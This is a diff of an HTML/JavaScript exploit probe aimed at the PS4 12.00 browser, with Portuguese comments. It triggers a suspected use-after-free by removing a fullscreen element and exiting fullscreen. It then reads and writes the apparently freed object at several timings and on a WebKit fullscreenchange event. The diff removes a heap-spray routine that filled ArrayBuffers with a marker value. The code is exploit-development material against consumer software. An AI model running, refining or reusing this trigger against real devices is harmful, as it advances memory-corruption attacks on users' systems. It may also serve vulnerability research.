@@ -2,14 +2,14 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Exploit Probe</title>
+<title>PS4 UAF Timing Hunter</title>
 </head>
 <body style="background:#111;color:#0f0;">
 
-<h2>PS4 12.00 - UAF Exploit Probe</h2>
-<button onclick="runTest()">Run Exploit Probe</button>
+<h2>PS4 12.00 - UAF Timing Hunter</h2>
+<button onclick="runTest()">Run Test</button>
 
-<pre id="log" style="height:300px;overflow:auto;"></pre>
+<pre id="log" style="height:320px;overflow:auto;"></pre>
 
 <script>
 const PATTERN = 2.121995791e-314;
@@ -20,7 +20,7 @@ function log(msg) {
 }
 
 // ==========================
-// Heap base (igual ao seu)
+// Heap original (inalterado)
 // ==========================
 function setupHeap() {
     let controllers = [];
@@ -35,7 +35,7 @@ function setupHeap() {
 }
 
 // ==========================
-// Fullscreen
+// Fullscreen original
 // ==========================
 function setupFullscreen() {
     let fsTarget = document.createElement("div");
@@ -58,57 +58,46 @@ function setupFullscreen() {
 }
 
 // ==========================
-// Spray direcionado
+// Probe avançado
 // ==========================
-function heapSpray() {
-    let spray = [];
+function probeObject(tag, obj) {
+    log("---- PROBE " + tag + " ----");
 
-    for (let i = 0; i < 10000; i++) {
-        let buf = new ArrayBuffer(0x100);
-        let f64 = new Float64Array(buf);
-
-        for (let j = 0; j < f64.length; j++) {
-            f64[j] = PATTERN;
-        }
-
-        spray.push(f64);
-    }
-
-    return spray;
-}
-
-// ==========================
-// Tentativa de leitura pós-free
-// ==========================
-function probeObject(obj) {
     try {
-        log("[PROBE] innerHTML: " + obj.innerHTML);
+        log("[innerHTML] " + obj.innerHTML);
     } catch(e) {
-        log("[PROBE] innerHTML ERROR: " + e);
+        log("[innerHTML ERROR] " + e);
     }
 
     try {
         obj.innerHTML = "UAF?";
-        log("[PROBE] write innerHTML OK");
+        log("[write] OK");
     } catch(e) {
-        log("[PROBE] write ERROR: " + e);
+        log("[write ERROR] " + e);
     }
 
     try {
         let rect = obj.getBoundingClientRect();
-        log("[PROBE] rect: " + JSON.stringify(rect));
+        log("[rect] w=" + rect.width + " h=" + rect.height);
     } catch(e) {
-        log("[PROBE] rect ERROR: " + e);
+        log("[rect ERROR] " + e);
+    }
+
+    try {
+        let style = obj.style;
+        log("[style] access OK");
+    } catch(e) {
+        log("[style ERROR] " + e);
     }
 }
 
 // ==========================
-// Trigger (mantido + expandido)
+// Trigger (IDÊNTICO + probes)
 // ==========================
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
 
-    // mantém referência global
+    // manter referência global
     window._uafRef = fsTarget;
 
     try {
@@ -117,15 +106,11 @@ function trigger(fsTarget) {
         log("[ERRO remove] " + e);
     }
 
-    // 🔥 spray imediatamente após free
-    let spray = heapSpray();
-    log("[*] Spray after free completo");
-
-    // 🔬 tenta acessar objeto potencialmente freed
-    setTimeout(() => {
-        log("[*] PROBING OBJECT...");
-        probeObject(window._uafRef);
-    }, 50);
+    // 🔬 probes em múltiplos tempos
+    setTimeout(() => probeObject("50ms", window._uafRef), 50);
+    setTimeout(() => probeObject("100ms", window._uafRef), 100);
+    setTimeout(() => probeObject("200ms", window._uafRef), 200);
+    setTimeout(() => probeObject("400ms", window._uafRef), 400);
 
     try {
         if (document.webkitIsFullScreen || document.fullscreenElement) {
@@ -139,7 +124,7 @@ function trigger(fsTarget) {
 }
 
 // ==========================
-// Execução principal
+// Execução (fluxo ORIGINAL)
 // ==========================
 function runTest() {
     document.getElementById("log").textContent = "Running... Press OPTIONS\n";
@@ -147,10 +132,19 @@ function runTest() {
     let controllers = setupHeap();
     let fsTarget = setupFullscreen();
 
+    // 🔥 sincronização com evento real do WebKit
+    document.addEventListener("webkitfullscreenchange", () => {
+        log("[EVENT] fullscreenchange");
+
+        setTimeout(() => {
+            probeObject("EVENT+100ms", window._uafRef);
+        }, 100);
+    });
+
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // 🔥 fluxo ORIGINAL preservado
+        // 🔥 fluxo original preservado
         setTimeout(() => trigger(fsTarget), 3000);
     };
 }
